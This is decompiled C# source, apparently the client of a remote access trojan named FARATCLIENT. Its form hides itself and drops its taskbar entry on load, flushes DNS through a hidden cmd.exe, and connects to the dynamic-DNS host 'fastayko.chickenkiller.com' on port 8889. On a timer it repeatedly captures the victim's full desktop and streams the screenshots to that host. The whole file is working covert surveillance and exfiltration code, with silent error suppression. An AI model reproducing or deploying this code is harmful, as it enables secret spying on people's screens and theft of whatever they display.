using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace FARATCLIENT
{
	// Token: 0x02000005 RID: 5
	public partial class Form2 : Form
	{
		// Token: 0x06000005 RID: 5 RVA: 0x0000211A File Offset: 0x0000031A
		public Form2()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000008 RID: 8
		[DllImport("dnsapi.dll")]
		private static extern uint DnsFlushResolverCache();

		// Token: 0x0600000A RID: 10 RVA: 0x000021E8 File Offset: 0x000003E8
		private void Form2_Load(object sender, EventArgs e)
		{
			base.Hide();
			base.ShowInTaskbar = false;
			try
			{
				new Process
				{
					StartInfo = new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						FileName = "cmd.exe",
						Arguments = "ipconfig /flushdns"
					}
				}.Start();
				uint num = Form2.DnsFlushResolverCache();
				string hostNameOrAddress = "fastayko.chickenkiller.com";
				IPAddress[] hostAddresses = Dns.GetHostAddresses(hostNameOrAddress);
				IPAddress[] array = hostAddresses;
				for (int i = 0; i < array.Length; i++)
				{
					IPAddress iPAddress = array[i];
					this.hostip = iPAddress.ToString();
				}
				this.portNumber = int.Parse("8889");
				try
				{
					this.client.Connect(this.hostip, this.portNumber);
					this.timer1.Start();
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002140 File Offset: 0x00000340
		private static Image GrabDesktop()
		{
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
			Graphics graphics = Graphics.FromImage(bitmap);
			graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
			return bitmap;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000021A4 File Offset: 0x000003A4
		public void SendDesktopImage()
		{
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			this.mainstream = this.client.GetStream();
			binaryFormatter.Serialize(this.mainstream, Form2.GrabDesktop());
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000021DB File Offset: 0x000003DB
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.SendDesktopImage();
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000021DB File Offset: 0x000003DB
		private void timer1_Tick_1(object sender, EventArgs e)
		{
			this.SendDesktopImage();
		}

		// Token: 0x04000029 RID: 41
		private readonly TcpClient client = new TcpClient();

		// Token: 0x0400002C RID: 44
		private string hostip;

		// Token: 0x0400002A RID: 42
		private NetworkStream mainstream;

		// Token: 0x0400002B RID: 43
		private int portNumber;
	}
}
